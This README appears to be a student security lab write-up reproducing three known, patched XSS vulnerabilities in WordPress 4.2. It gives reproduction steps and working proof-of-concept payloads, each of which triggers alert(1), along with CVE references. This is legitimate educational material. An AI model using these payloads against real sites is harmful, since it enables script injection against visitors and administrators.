# Cyber-Security-Week8

Time spent: 8 hours spent in total

Objective: Search, Retrieve, Process, Recreate, and document 3 vulnerability on this version of WordPress

Version of WordPress Tested: 4.2

Vulnerability 1 - Legacy Theme Preview Cross-Site Scripting (XSS)
Steps to reproduce:

Go to any post.
Paste the following as a comment:
<a href='/wp-admin/' title="" style="position:absolute;top:0;left:0;width:100%;height:100%;display:block;" onmouseover=alert(1)//'>Test</a>
Hover over the posted comment.
Alert(1) will pop up.
Type of Attack: XSS

Versions:

[!] Title: WordPress <= 4.2.3 - Legacy Theme Preview Cross-Site Scripting (XSS)

[i] Fixed in: 4.2.4

Sources:

[Link 1] Reference: https://wpvulndb.com/vulnerabilities/8133

[Link 2] Reference: https://core.trac.wordpress.org/changeset/33549

[Link 3] Reference: https://blog.sucuri.net/2015/08/persistent-xss-vulnerability-in-wordpress-explained.html

[Link 4] Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5734

GIF: https://imgur.com/a/uaj7O

Vulnerability 2 - Authenticated Cross-Site Scripting (XSS)
Steps to reproduce:

Go to any post.
Paste the following as a comment:
http://www.example.com/wp-admin/customize.php?theme=<svg onload=alert(1)>
Alert(1) will pop up.
Type of Attack: XSS

Versions:

[!] Title: WordPress 3.7-4.4 - Authenticated Cross-Site Scripting (XSS)

[i] Fixed in: 4.2.6

Sources:

[Link 1] Reference: https://wpvulndb.com/vulnerabilities/8358

[Link 2] Reference: https://wordpress.org/news/2016/01/wordpress-4-4-1-security-and-maintenance-release/

[Link 3] Reference: https://github.com/WordPress/WordPress/commit/7ab65139c6838910426567849c7abed723932b87

[Link 4] Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-1564

GIF: https://imgur.com/a/oHP7b

Vulnerability 3 - Pupload Same Origin Method Execution (SOME)
Steps to reproduce:

Go to any post.
Paste the following as a comment:
<button onclick="fire()">Click</button>
<script>
function fire() {
 open('javascript:alert(1)');
}
</script>
Click on the button.
Alert(1) will pop up.
Type of Attack: XSS

Versions:

[!] Title: WordPress <= 4.5.1 - Pupload Same Origin Method Execution (SOME)

[i] Fixed in: 4.2.8

Sources:

[Link 1] Reference: https://wpvulndb.com/vulnerabilities/8489

[Link 2] Reference: https://wordpress.org/news/2016/05/wordpress-4-5-2/

[Link 3] Reference: https://github.com/WordPress/WordPress/commit/c33e975f46a18f5ad611cf7e7c24398948cecef8

[Link 4] Reference: https://gist.github.com/cure53/09a81530a44f6b8173f545accc9ed07e

[Link 5] Reference: http://avlidienbrunn.com/wp_some_loader.php

[Link 6] Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-4566

GIF: https://imgur.com/a/7gK3e
